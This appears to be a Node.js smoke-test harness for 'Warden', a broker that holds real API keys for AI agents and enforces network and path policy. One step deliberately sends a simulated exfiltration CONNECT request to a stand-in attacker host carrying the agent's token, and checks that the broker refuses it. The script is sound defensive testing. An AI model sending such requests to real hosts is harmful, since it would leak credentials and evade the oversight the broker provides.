#!/usr/bin/env node
/**
 * Warden broker smoke harness.
 *
 * Boots the broker as a plain host process against a fake upstream and asserts
 * the enforcement behaviours end to end. It does NOT exercise the container
 * topology -- see apps/server/src/warden/isolation.integration.test.ts for that.
 *
 * Usage:  npm run build -w @launchpad/server && node scripts/warden-smoke.mjs
 */
import { spawn } from "node:child_process";
import { createServer } from "node:http";

const REAL_KEY = "ark_live_smoke_secret_value_abc123";

/** Fails loudly. Without this the script exits 0 even when Warden is broken. */
let failures = 0;
function check(condition, message) {
  if (condition) return;
  failures += 1;
  console.error("  FAILED: " + message);
}
const upstream = createServer((req, res) => {
  res.writeHead(200, { "content-type": "application/json" });
  res.end(JSON.stringify({ ok: true, auth: req.headers.authorization, usage: { total_tokens: 77 } }));
});
await new Promise((r) => upstream.listen(0, "127.0.0.1", r));
const up = upstream.address().port;

const broker = spawn("node", [new URL("../apps/server/dist/warden/broker-main.js", import.meta.url).pathname], {
  env: { ...process.env, PATH: process.env.PATH,
    WARDEN_UPSTREAM_BASE_URL: `http://127.0.0.1:${up}/api/v3`,
    ARK_API_KEY: REAL_KEY, WARDEN_CONTROL_SECRET: "smoke-secret-token",
    WARDEN_PORT: "8798", WARDEN_CONTROL_PORT: "8799",
    WARDEN_ALLOWED_NETWORK_HOSTS: "api.github.com:443", WARDEN_UNSAFE_SKIP_INTERFACE_GUARD: "1" },
  stdio: ["ignore", "pipe", "pipe"] });
broker.stdout.on("data", (d) => process.stdout.write("  broker: " + d));

/** Teardown must run even when a check throws, or the broker outlives the run. */
let tornDown = false;
function cleanup() {
  if (tornDown) return;
  tornDown = true;
  try { broker.kill("SIGTERM"); } catch { /* already gone */ }
  try { upstream.close(); } catch { /* already closed */ }
}
function die(reason, error) {
  console.error("\nSmoke run aborted: " + reason);
  if (error) console.error(String(error?.message ?? error));
  cleanup();
  process.exit(1);
}
process.on("uncaughtException", (error) => die("unexpected exception", error));
process.on("unhandledRejection", (error) => die("unhandled rejection", error));
process.on("exit", cleanup);
broker.stderr.on("data", (d) => process.stdout.write("  broker!: " + d));

const { RemoteWardenControl } = await import(new URL("../apps/server/dist/warden/control-client.js", import.meta.url).href);
const control = new RemoteWardenControl("http://127.0.0.1:8799", "smoke-secret-token");
for (let i = 0; i < 40 && !(await control.health()); i++) await new Promise(r => setTimeout(r, 100));
const healthy = await control.health();
console.log("1. broker healthy:", healthy);
check(healthy, "broker did not become healthy");

const begun = await control.beginRun({ agentId: "a1", runId: "r1", traceId: "t1",
  humanPrincipal: { kind: "human", id: "user:alice", displayName: "Alice" },
  agentPrincipal: { kind: "agent", id: "agent:a1", displayName: "A" },
  workspacePath: "/tmp/ws" });
console.log("2. grant minted, fingerprint:", begun.grant.tokenFingerprint, "| token is wgt_:", begun.token.startsWith("wgt_"));
check(begun.token.startsWith("wgt_"), "minted token has the wrong format");
check(begun.grant.tokenFingerprint.length === 8, "grant fingerprint has the wrong length");

const good = await fetch("http://127.0.0.1:8798/v1/responses", { method: "POST",
  headers: { authorization: "Bearer " + begun.token, "content-type": "application/json" },
  body: JSON.stringify({ input: "hi" }) });
const body = await good.json();
console.log("3. model call:", good.status, "| upstream saw real key:", body.auth === "Bearer " + REAL_KEY);
check(good.status === 200, "model call did not succeed");
check(body.auth === "Bearer " + REAL_KEY, "real key was not substituted upstream");
check(!begun.token.includes(REAL_KEY), "grant token leaked the real key");

const bad = await fetch("http://127.0.0.1:8798/v1/responses", { method: "POST",
  headers: { authorization: "Bearer wgt_forged", "content-type": "application/json" }, body: "{}" });
const badBody = await bad.json();
console.log("4. forged token:", bad.status, badBody.error.code);
check(bad.status === 403, "forged token was accepted");
check(badBody.error.code === "no_grant", "forged token gave the wrong deny code");

const net = await import("node:net");
const raw = await new Promise((res) => { const s = net.connect(8798, "127.0.0.1", () => {
  s.write(`CONNECT attacker.example.net:443 HTTP/1.1\r\nProxy-Authorization: Bearer ${begun.token}\r\n\r\n`); });
  let b = ""; s.on("data", (c) => b += c); s.on("close", () => res(b)); });
console.log("5. exfil CONNECT:", raw.split("\r\n")[0], "|", /host_not_allowed/.test(raw) ? "host_not_allowed" : raw.slice(0,120));
check(/403/.test(raw), "disallowed CONNECT was not refused");
check(/host_not_allowed/.test(raw), "CONNECT denial had the wrong code");

const badPath = await fetch("http://127.0.0.1:8798/v1/files", { method: "POST",
  headers: { authorization: "Bearer " + begun.token, "content-type": "application/json" }, body: "{}" });
const badPathBody = await badPath.json();
console.log("5b. provider path /v1/files:", badPath.status, badPathBody.error.code);
check(badPathBody.error.code === "path_not_allowed", "/v1/files was not refused");

const badseg = await fetch("http://127.0.0.1:8798/v1/responses/anything", { method: "POST",
  headers: { authorization: "Bearer " + begun.token }, body: "{}" });
const badsegBody = await badseg.json();
console.log("5c. POST /responses/anything:", badseg.status, badsegBody.error.code);
check(badseg.status === 403 && badsegBody.error.code === "path_not_allowed",
  "an extra path segment on a POST path was not refused");

const goodseg = await fetch("http://127.0.0.1:8798/v1/models/ep-abc", {
  headers: { authorization: "Bearer " + begun.token } });
console.log("5d. GET /models/ep-abc:", goodseg.status);
check(goodseg.status === 200, "GET /models/{id} was incorrectly refused");

await control.revokeGrant(begun.grant.id, "operator kill switch");
const after = await fetch("http://127.0.0.1:8798/v1/responses", { method: "POST",
  headers: { authorization: "Bearer " + begun.token, "content-type": "application/json" }, body: "{}" });
const afterBody = await after.json();
console.log("6. after revoke:", after.status, afterBody.error.code);
check(after.status === 403, "revoked grant still worked");
check(afterBody.error.code === "grant_revoked", "revocation gave the wrong deny code");

const tpl = await control.listTemplates();
console.log("9. templates:", tpl.map(t=>t.id).join(", "));
// Apply model-only explicitly. The broker starts with api.github.com in
// WARDEN_ALLOWED_NETWORK_HOSTS, so labelling the startup policy "model-only"
// would have been inaccurate.
await control.applyTemplate("model-only");
const chk1 = await control.checkPolicy({plane:"network",host:"api.github.com",port:443,method:"CONNECT"});
console.log("10. dry-run api.github.com (model-only):", chk1.allowed, chk1.code);
check(chk1.allowed === false, "model-only template still permitted a network host");
await control.applyTemplate("model-plus-github");
const chk2 = await control.checkPolicy({plane:"network",host:"api.github.com",port:443,method:"CONNECT"});
const chk3 = await control.checkPolicy({plane:"network",host:"attacker.example.net",port:443,method:"CONNECT"});
console.log("11. after model-plus-github:", "github="+chk2.allowed, "attacker="+chk3.allowed+"/"+chk3.code);
check(chk2.allowed === true, "model-plus-github did not permit github");
check(chk3.allowed === false, "model-plus-github permitted an unlisted host");
const grantCount = (await control.listGrants()).length;
console.log("12. grants minted by dry runs:", grantCount, "(expected 1, the real one)");
check(grantCount === 1, "dry-run checks unexpectedly minted grants");

const p1 = await control.checkPolicy({plane:"network",host:"attacker.example.net",port:443,method:"CONNECT"});
console.log("13. dry-run attacker:", p1.allowed, p1.code);

const trace = await control.getTrace("t1");
const finalGrant = await control.getGrant(begun.grant.id);
console.log("7. trace spans:", trace.spans.length, "| denied:", trace.spans.filter(s=>s.status==="denied").length,
  "| tokens metered:", finalGrant.usage.totalTokens);
// The fake upstream reports 77 tokens per response and the harness makes more
// than one successful model-plane call, so assert that metering HAPPENED rather
// than pinning an exact total that shifts whenever a call is added.
check(finalGrant.usage.totalTokens >= 77, "token usage was not metered");
check(finalGrant.usage.estimated === false, "token usage fell back to an estimate");
check(trace.spans.some((sp) => sp.status === "denied"), "no denial reached the trace");
const serialized = JSON.stringify(trace);
console.log("8. real key absent from trace:", !serialized.includes(REAL_KEY),
  "| token absent from trace:", !serialized.includes(begun.token));
check(!serialized.includes(REAL_KEY), "real key appeared in the trace");
check(!serialized.includes(begun.token), "grant token appeared in the trace");

cleanup();
if (failures > 0) {
  console.error("\n" + failures + " smoke check(s) FAILED");
  process.exit(1);
}
console.log("\nAll smoke checks passed.");
process.exit(0);
